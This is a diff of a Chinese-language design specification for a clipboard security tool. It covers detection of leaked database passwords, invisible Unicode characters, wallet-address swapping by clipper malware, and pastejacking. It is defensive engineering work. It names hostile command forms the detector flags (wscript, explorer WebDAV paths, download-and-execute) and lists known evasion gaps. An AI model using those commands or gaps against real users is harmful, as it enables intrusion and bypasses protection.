+| conn-string-url | `postgres(ql)://`、`mysql://`、`mariadb://`、`mongodb(+srv)://`、`redis(s)://`、`amqp(s)://`、`mssql://`、`sqlserver://`、`cockroachdb://`、`clickhouse://`，scheme 可以帶驅動（`postgresql+psycopg2://`）；`帳號:密碼@主機`，帳號可以是空的（`redis://:密碼@`） | 只有密碼那一段（3–256 字，不含空白、`/`、`?`、`#`、`@`、引號、`<>`） |
+| conn-string-odbc | ODBC／ADO.NET／JDBC 的 `key=value;`：前面要先有一個連線參數（`Server`、`Data Source`、`Host`、`Address`、`Uid`、`User Id`、`User`、`Username`、`Database`、`Initial Catalog`、`DSN`、`Driver`、`Provider`），之後最多 8 個參數內出現 `Password=` 或 `Pwd=` | 值：`{…}`、`"…"`、`'…'` 裡面的內容，或到 `;`、空白、引號為止 |
+
+- 種類是 `api_key`（跟「疑似金鑰或密碼」同一類），標籤「資料庫連線密碼」。遮罩只遮密碼、什麼都不留（`********`，最多 8 個星號）；貼遮罩版會保留帳號、主機、資料庫名稱（`postgres://app:********@db…/app`）。
+- **不算的**：佔位字（同 §5.5：`example`、`changeme`、`your_…`、`<…>`、`${…}`、`{{…}}`、`%(…)s`、`…`）；`password`、`pass`、`pwd`、`secret`、`root`、`admin`、`guest`、`postgres`、`mysql`、`test`、全是 `*`／`x`／`.` 的值；`$VAR`、`$(cmd)`、`%s`、`{name}`、`:name` 這類變數。預設帳密刻意不算的理由見 §5.2。
+- 不要求亂度：連線字串本身就是很強的上下文，而且資料庫密碼常常是短的、人取的（`hunter2`）。
+- 排在 gitleaks（20）後面、第 2 層（30）前面：`DB_PASSWORD=` 這類同時符合第 2 層的寫法用連線字串的標籤。
+
 ## 6. 隱藏字元與錢包掉包
 
-### 6.1 隱藏字元（`HiddenCharDetector.cs`）：一律只判 Suspicious
+### 6.1 隱藏字元（`crates/core/src/hidden/`，舊版 `crates/core/src/hidden/mod.rs`）：一律只判 Suspicious
+
+清單類的資料在 `rules/hidden/`（1b）：`shell-commands.json`（結尾換行、「這一行像不像指令」用的程式清單）、`homoglyphs.json`（各文字系統的同形字與所屬區塊）、`tag-sequences.json`（標準區旗的 TAG 序列）、`joiners.json`（emoji 範圍、複雜文字範圍、各印度系文字的 virama）。載入一次並驗證（單元測試保證清單不是空的、code point 合法）。
+
 | 項目 | 規則 | 例外 |
 |---|---|---|
-| 零寬字元 | U+200B、U+2060、U+FEFF；U+200C 和 U+200D 不在例外情況時 | emoji 的 ZWJ 序列，以及阿拉伯文、波斯文、印度系文字中的 ZWNJ / ZWJ |
+| 零寬字元 | U+200B、U+2060、U+FEFF；U+200C 和 U+200D 不在例外情況時 | emoji 的 ZWJ 序列；阿拉伯文、波斯文、印度系文字中夾在兩個字母（含組合符號）之間的 ZWNJ / ZWJ；**ZWJ 接在「同一個印度系區塊的字母 + 該區塊的 virama」後面**（1b），而且後面是空白、標點、同區塊的字元或文字結尾，見下方說明 |
 | Unicode TAG | U+E0000–E007F（UTF-16 的代理對 U+DB40 U+DC00–DC7F，一個字元算一個）。可以把整段英文藏成看不見的字，給 AI 讀的 prompt injection | 只放行有標準圖案的區旗：🏴 + `gbeng`／`gbsct`／`gbwls` + 結束 TAG（英格蘭、蘇格蘭、威爾斯）。其他組合在各平台都只顯示成黑旗，TAG 部分一樣看不見，照算；區旗後面多接的 TAG 也照算 |
 | Soft hyphen | U+00AD，只在換行處才顯示 | 夾在兩個字母之間（德文等語言的斷字點），而且那一行不像指令（§6.1 結尾換行同一套判斷）、不含 `://` 或 `www.` |
 | 蒙古文母音分隔符 | U+180E（Unicode 6.3 起是看不見的格式字元） | 夾在兩個蒙古文字母（U+1800–18AF）之間 |
 | 韓文填充字元 | U+115F、U+1160、U+3164、U+FFA0（顯示成空白，常被拿來做「看不見的名字」） | U+115F 後面接母音字母、U+1160 前面接子音字母（組合韓文字母的正常用法）；U+3164、U+FFA0 沒有現代的正常用法，不放行 |
 | 變體選擇符 | 連續兩個以上（U+FE00–FE0F、U+E0100–E01EF），可逐 byte 藏資料（variation selector smuggling）；U+E0100 以上接在非漢字後面 | 一個字後面接一個（emoji 的 U+FE0F、漢字異體字序列）；連續但全是 U+FE0E／U+FE0F（重複的 emoji 樣式選擇符，常見手誤） |
+| 組合字素連接符（1b） | U+034F（CGJ）。看不見，常被用來拆開關鍵字躲過過濾（`pay` + U+034F + `pal`） | 後面接組合符號（`\p{M}`）：阻止正規化重排、讓排序區分 `u` + ¨ 和 `ü`、聖經希伯來文的母音順序，這是它唯一的正常用法 |
+| 高棉文固有母音（1b） | U+17B4、U+17B5。Unicode 已不建議使用，顯示成空白，常見於「看不見的名字」清單 | 夾在兩個高棉文字元（U+1780–17FF）之間（舊的高棉文文件） |
+| 看不見的數學運算子（1b） | U+2061–2064。前後緊鄰零寬字元或另一個數學運算子（U+200B–200D、U+2060–2064、U+FEFF）：零寬隱寫工具（StegCloak 等）就是用 ZWNJ、ZWJ 和這四個字元把資料編成一串；或所在那一行像指令或網址（soft hyphen 同一套判斷） | 單獨出現在一般文字裡：Word 方程式、MathML 複製出來的文字在運算元之間放一個 U+2061（函數套用，`sin` + U+2061 + `x`）或 U+2062（隱形乘號） |
 | Bidi 控制字元 | U+202A–202E、U+2066–2069 | 無 |
 | 同形字 | 一個英文單字裡混入看起來一樣的西里爾或希臘字母；或整段沒有真正的西里爾或希臘文字，卻出現全由同形字組成的單字 | 真正的俄文、希臘文，以及 `2πr`、`μm`、中日韓文字 |
 | 結尾換行 | 最後一行看起來像 shell 指令，而且結尾有換行 | 一般句子 |
 
+**像不像指令**（結尾換行、soft hyphen、數學運算子共用）：去掉文件提示字元（`$ `、`> `、`# `、`PS C:\> `）後，指令偵測（§3，`command::analyze`）判為 Suspicious 以上，或第一個字（去掉 `.exe`，不分大小寫）在 `shell-commands.json` 裡、或以 `./`、`.\` 開頭，而且下一個字不是中日韓文字（「git 是版本控制工具」是句子）。1a 暫時用插件的指令訊號（§7）代替指令偵測；1b 改回舊版的做法，所以 `wscript //e:jscript …`、`explorer \\host@SSL\…` 這類只有指令偵測認得的程式也算指令。
+
+**印度系文字的 ZWJ／ZWNJ**（1b，#benign.text.126）：印度系文字用 virama（`्`、`്`…）表示子音不帶母音，後面的 ZWJ／ZWNJ 選擇字形：
+- 子音 + virama + ZWJ：天城文等的半字形（`क्‍`），以及馬拉雅拉姆文的 **chillu** 字母（`ന്‍` = NA + VIRAMA + ZWJ）。chillu 是 Unicode 5.1 以前的編碼方式，很多輸入法和舊網頁到現在還在用；chillu 出現在**字尾**，後面接空白、標點或文字結尾。
+- 子音 + virama + ZWNJ：強制顯示 virama（不合字），後面一定接另一個子音，已經由「夾在兩個字母之間」涵蓋。
+- 僧伽羅文的 rakaransaya、yansaya（子音 + al-lakuna + ZWJ + ra／ya）、孟加拉文的 `র‍্য`（ra + ZWJ + virama）也都夾在字母之間。
+
+所以只放寬「ZWJ 接在 virama 後面」這一種：virama 前面必須是**同一個區塊**的字母（`joiners.json` 列出天城、孟加拉、古木基、古吉拉特、奧里亞、坦米爾、泰盧固、卡納達、馬拉雅拉姆、僧伽羅文的 virama 和區塊），ZWJ 後面必須是空白、標點、同區塊的字元或文字結尾。英文字母之間的 ZWJ、接在英文字母後面的 virama + ZWJ、chillu 後面直接接英文字母或數字、連續兩個 ZWJ、virama 後面接 ZWNJ 再接空白，都照算。
+
 通知只顯示字元的 code point（例如 U+0435），不顯示原文；TAG 只顯示數量，不解碼藏起來的內容。
 
-**長度**：不會因為總長度就整段跳過（以前超過 100,000 字直接不檢查）。每一項都是逐字線性掃描，桌面版最多讀進來的 1,048,576 字也在 1 秒內完成。唯一較貴的是「soft hyphen 那一行像不像指令」，同一行只判斷一次，整段最多判斷 256 行，之後的行只檢查網址。
+**長度**：不會因為總長度就整段跳過（以前超過 100,000 字直接不檢查）。每一項都是逐字線性掃描。唯一較貴的是「soft hyphen／數學運算子那一行像不像指令」，同一行只判斷一次，整段最多判斷 256 行（`MAX_SOFT_HYPHEN_COMMAND_CHECKS`），之後的行只檢查網址。release 建置下每種 1 Mi 字的病態輸入（滿滿的 ZWJ、virama + ZWJ、數學運算子、每行都有 soft hyphen 的指令、超長的指令行…）≤ 150 ms（`hidden::tests::pathological_inputs_are_fast`）。
 
-沒有加入的字元與理由：U+2061–2064（看不見的數學運算子，Word 方程式複製出來的文字會帶 U+2061，誤報風險高）；U+200E／U+200F（LRM／RLM，希伯來文、阿拉伯文常用）；U+034F、U+17B4／17B5 等（看不見，但沒有已知的濫用案例，之後有需要再加）。
+**1b 對「沒有加入的字元」的決定**：
 
-已知缺口：soft hyphen 夾在兩個字母之間、所在的那行又不像指令或網址時放行，所以可以用來拆開句子裡的關鍵字；第 256 行之後的 soft hyphen 不判斷指令；CommandNormalizer 不會去掉這些字元（§3.0），拆開指令名稱的情況要靠這裡提醒。
+| 字元 | 決定 | 理由 |
+|---|---|---|
+| U+2061–2064 | 有條件加入（見上表） | 有正常來源（Word 方程式、MathML），所以單獨出現不算；但零寬隱寫工具（StegCloak）把它們和 ZWNJ／ZWJ 連成一串藏資料，方程式不會連續出現兩個；在指令或網址裡也沒有正常用途 |
+| U+034F | 加入，後面接組合符號時放行 | 正常用法只有「接在組合符號前面」；其他位置純粹是看不見的字，已知被用來拆開關鍵字躲過內容過濾 |
+| U+17B4／17B5 | 加入，夾在高棉文字元之間時放行 | Unicode 標為不建議使用、預設忽略；在「看不見的名字」、繞過過濾的字元清單裡常見；高棉文以外沒有正常來源 |
+| U+200E／U+200F | 不加入 | LRM／RLM，希伯來文、阿拉伯文常用 |
 
-### 6.2 錢包掉包（`WalletAddress.cs`、`WalletSwapDetector.cs`、`src/ClipGuard.App/UserInput.cs`）
+已知缺口：soft hyphen 夾在兩個字母之間、所在的那行又不像指令或網址時放行，所以可以用來拆開句子裡的關鍵字；單獨一個數學運算子夾在一般句子裡也放行（同理）；第 256 行之後的 soft hyphen、數學運算子不判斷指令；CommandNormalizer 不會去掉這些字元（§3.0），拆開指令名稱的情況要靠這裡提醒；virama + ZWJ 後面接空白的例外只看前後各一兩個字，攻擊者可以在印度系文字的字尾藏一個 ZWJ（只有一個，藏不了多少資料，而且前面必須是真的子音 + virama）。
+
+### 6.2 錢包掉包（`crates/core/src/wallet/mod.rs`、`crates/core/src/wallet/swap.rs`、`UserInput`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做））
 
 Clipper 惡意程式監聽剪貼簿，看到地址就換成攻擊者的地址，做法是**原地取代**：句子裡的其他文字一個字都不變。它跟「使用者自己又複製了另一個地址」的差別有三個：換得很快、換的時候使用者沒有任何操作、前後文字完全相同。
 
-**找地址**：剪貼簿裡每一段連續英數字（前後不能緊鄰英數字）都拿去驗證，所以句子裡的地址也找得到，hash、Base64 這類更長的字串不會被切一段出來誤認。只掃前 100,000 字，每份內容最多驗證 256 個長度符合的候選字串。支援 BTC（Base58Check、bech32、bech32m）、TRON（Base58Check）、ETH（只檢查格式，沒有驗 EIP-55）。
+**找地址**：剪貼簿裡每一段連續英數字（前後不能緊鄰英數字）都拿去驗證，所以句子裡的地址也找得到，hash、Base64 這類更長的字串不會被切一段出來誤認。只掃前 100,000 字，每份內容最多驗證 256 個長度符合的候選字串。
+
+| 幣種 | 格式 | 驗證 |
+|---|---|---|
+| BTC | `1…`、`3…` Base58Check；`bc1…` bech32／bech32m | 檢查碼 |
+| TRON | `T…` Base58Check（版本 0x41） | 檢查碼 |
+| ETH（含 EVM 鏈） | `0x` + 40 hex | 大小寫混用時驗 **EIP-55**（1b，Keccak-256 自己實作在 `wallet/keccak.rs`）；全小寫、全大寫沒有檢查碼，照樣有效 |
+| XRP（1b） | `r…` Base58Check，Ripple 字母表，版本 0x00，26–35 字 | 檢查碼 |
+| Solana（1b） | Base58（Bitcoin 字母表）32–44 字，解碼後剛好 32 bytes | **沒有檢查碼**，見下方 |
+
+**Solana 怎麼避免誤認**（1b）：Solana 地址就是 32 bytes 公鑰的 Base58，沒有檢查碼，所以只能靠格式排除：
+- 全部是 hex 數字（`0-9a-fA-F`）的字串當成 hash，不是地址。git SHA-1（40 位 hex）本來就解碼不到 32 bytes（58⁴⁰ < 2²⁵⁶），但開頭有幾個 `1` 時可能剛好湊到；SHA-256 hex（64 位）超過 44 字。代價：全是 `1` 的 System Program id `111…1` 不算地址（沒有人會轉帳給它）。
+- 看得出是 Base64 一段的不算：前一個字元是 `+`，或後一個字元是 `+`、`/`、`=`。前一個字元是 `/` 照算（區塊瀏覽器網址 `/address/<地址>`）。標準 Base64 的 `+`、`/` 也會把字串切成短的片段。
+- 長度或解碼後的 bytes 不對（44 個 `z` 解碼是 33 bytes）的 Base58 不算。
+- 剩下的「43–44 字、解碼剛好 32 bytes 的隨機 Base58」（其他 Base58 token、Solana 的 block hash）和真地址分不出來，會被當成地址。影響有限：地址只用來判斷掉包，單獨出現不會警告；要誤報還得在 1–3 秒內出現「前後文字完全相同、只有這段不同」的另一份內容。
 
 **記憶**：只記最後一次含地址的內容：地址、「地址換成佔位字元、去頭尾空白後的文字」的 SHA-256（不留原文）、時間。不含地址的內容不會清掉記憶，所以 A → `x` → B 一樣拿 A 比。
 
@@ -562,7 +732,7 @@ Clipper 惡意程式監聽剪貼簿，看到地址就換成攻擊者的地址，
 | clipper 自己模擬輸入，或超過 3 秒才換 | 漏報 | 刻意繞過，見下方已知缺口 |
 
 - 通知不顯示地址，連遮罩版都不顯示。假地址的頭尾常跟真地址一樣，顯示遮罩版反而會讓人誤以為沒被換掉。通知只寫幣種和間隔。
-- 已知缺口：超過 3 秒才換；1–3 秒才換、只有地址、而且使用者正好有輸入；clipper 同時改了其他文字；地址被拆開（中間插零寬字元或換行）；第 256 個候選字串之後、或第 100,000 字之後的地址；ETH 沒驗 EIP-55，其他鏈（SOL、XRP 等）不支援。
+- 已知缺口：超過 3 秒才換；1–3 秒才換、只有地址、而且使用者正好有輸入；clipper 同時改了其他文字；地址被拆開（中間插零寬字元或換行）；第 256 個候選字串之後、或第 100,000 字之後的地址；Solana 沒有檢查碼，隨機的 32-byte Base58 會被當成地址（見上）；XRP 的 X-address（`X…`）、Cardano、Litecoin、Dogecoin、Monero 等其他鏈不支援；ETH 全小寫或全大寫的地址沒有檢查碼可驗（clipper 換成另一個全小寫地址一樣認得出掉包，只是格式本身擋不了打錯字）。
 
 ## 7. 瀏覽器插件（`extension/`）
 
@@ -584,18 +754,18 @@ Clipper 惡意程式監聽剪貼簿，看到地址就換成攻擊者的地址，
 | 國家包怎麼選（§5.6） | 一個地區設定（`RegionInfo.CurrentRegion`）加上 `secret-packs.json` | `navigator.languages` 裡每個語言的聯集，沒有手動設定 |
 | 機密的正規化、分隔符號、JWT、長度上限（§5.0） | 有 | 同一套（`normalizeForSecrets`、`cardCandidates`、`MAX_SCAN_LENGTH` = 1 Mi 字頭尾）。插件不分段，頭尾各一次正規化 |
 | 規則檔的 regex 引擎 | NonBacktracking（保證線性時間），群組在比對到的那段重比 | V8 的回溯引擎；會變成 O(n²) 的規則在轉換時就不收（§5.4），兩邊的測試都量每條規則 |
-| 指令樣式 | 完整版 `CommandDetector` | 只有少數幾種（用於判斷 Pastejacking）；沒有 #20 的「下載後直接執行」、官方網站清單，也沒有 #21 的 LOLBin、UNC/WebDAV、protocol handler，也沒有誘餌註解（含 #27 的多語版本） |
+| 指令樣式 | 完整版 `CommandDetector` | 只有少數幾種（用於判斷 Pastejacking，1b 起樣式在 `rules/pastejack/signals.json`）；沒有 #20 的「下載後直接執行」、官方網站清單，也沒有 #21 的 LOLBin、UNC/WebDAV、protocol handler，也沒有誘餌註解（含 #27 的多語版本） |
 | 指令正規化（§3.0） | 有（`CommandNormalizer`） | 沒有：完整路徑、`^`、引號拆字、dash 變體都認不得 |
 | 貼上提示的 Enter | 取消（§5.3） | 貼遮罩版。插件直接插入文字，不必換剪貼簿，沒有桌面版的副作用 |
 | 貼上攔截的範圍 | 預設只攔登記的機密 | 所有偵測到的機密（插件沒有登記機密） |
-| 看不見的字元（§6.1） | 各字元有例外規則（區旗、斷字點、韓文組合、單一變體選擇符） | 同一份清單加上 U+200E／200F、U+2061–2064，但**沒有例外規則**，也不看 U+FE00–FE0F：插件比的是「網頁寫入」比「使用者選取」多出來的數量，使用者自己選到的區旗、斷字點兩邊都有，會互相抵銷 |
+| 看不見的字元（§6.1） | 各字元有例外規則（區旗、斷字點、韓文組合、單一變體選擇符、virama + ZWJ、CGJ 接組合符號、高棉文、單獨的數學運算子） | 同一份清單（1b 起在 `rules/pastejack/hidden-chars.json`，也加了 U+034F、U+17B4–17B5）加上 U+200E／200F，但**沒有例外規則**，也不看 U+FE00–FE0F：插件比的是「網頁寫入」比「使用者選取」多出來的數量，使用者自己選到的區旗、斷字點兩邊都有，會互相抵銷 |
 
 ## 8. 測試資料規範
 - 只能用假資料：自己算出能通過檢查碼的號碼、發卡機構公開的測試卡號、明顯是假的 key。#27 的國家包用官方或規格公布的範例號碼（GB 11643 的 `11010519491231002X`、ECBS／SWIFT 的 IBAN 範例、SSA 已作廢的 `078-05-1120`、`219-09-9999`、各國保留給虛構用的電話號碼），其他在測試裡用另外寫的演算法補上檢查碼（`SecretPacksTests` 的 `Iban`、`ChinaId`、`MyNumber`），順便跟 `Checksums` 交叉驗證。
 - 網址一律用 `example.invalid`。惡意指令樣本要在執行時用片段組合，不要以完整字串寫進檔案（理由同文件開頭的防毒說明）。
 - 偵測規則的測試要同時有「該命中」和「不該命中」兩種樣本。誤報樣本至少包含：日期、訂單號碼、UUID、hash、Base64、一般中英文句子、官方安裝指令。
 - **API key 樣本不能完整寫進檔案**（包括規則檔和測試）：GitHub 的 push protection 會擋，防毒也可能有反應。測試用「前綴 + 固定種子的亂數」在執行時產生（C# 的 `SecretRulesTests.Gen` 和 JS 的 `gen` 產生一樣的字串）。規則檔只放 regex；`SecretRulesTests` 會掃一次規則檔，確認裡面沒有長得像 key 的字串。
-- 機密的誤報樣本放在 `tests/fixtures/secret-false-positives.json`，桌面版和插件共用；新增誤報案例時加在這裡。
+- 機密的誤報樣本放在 `corpus/cases/secret-false-positives.jsonl`，桌面版和插件共用；新增誤報案例時加在這裡。
 
 ## 9. Review 檢查清單
 
@@ -610,6 +780,6 @@ Review 一個會動到偵測行為的 PR 時，逐項確認：
 - [ ] **長度上限**：新規則碰到超長輸入時，不是「整段跳過」（#19 的教訓），而且不會卡住 UI。
 - [ ] **繞過**：想想正規化問題，例如大小寫、全形、路徑、引號、`^`、dash 變體、零寬字元。
 - [ ] **C# / JS 一致**：改到兩邊都有的規則時，兩邊都要改，或是在 §7 的不一致表裡記下來。
-- [ ] **規則檔**：改了 `rules/*.json` 有重新產生 `extension/lib/rules.generated.js`；新的 regex 符合 §5.4 的語法限制，兩邊的「1 Mi 病態輸入」測試都過；gitleaks 規則只透過 `tools/convert-gitleaks.mjs` 更新，不手改 `rules/gitleaks.json`。
+- [ ] **規則檔**：改了 `rules/*.json` 有重新產生 `extension/lib/rules.generated.js`；新的 regex 符合 §5.4 的語法限制，兩邊的「1 Mi 病態輸入」測試都過；gitleaks 規則只透過 `cargo run -p xtask -- rules gitleaks`（`xtask/src/rules.rs`） 更新，不手改 `rules/gitleaks.json`。
 - [ ] **測試資料**：符合 §8 的規範。
 - [ ] **介面文字**：新的通知、說明、機密名稱放進 `.resx`（桌面）或 `_locales`（插件），英文和 zh-TW 都要有，`{0}` 參數一致；改了 `.resx` 有重新執行 `node tools/gen-resx-accessors.mjs`。
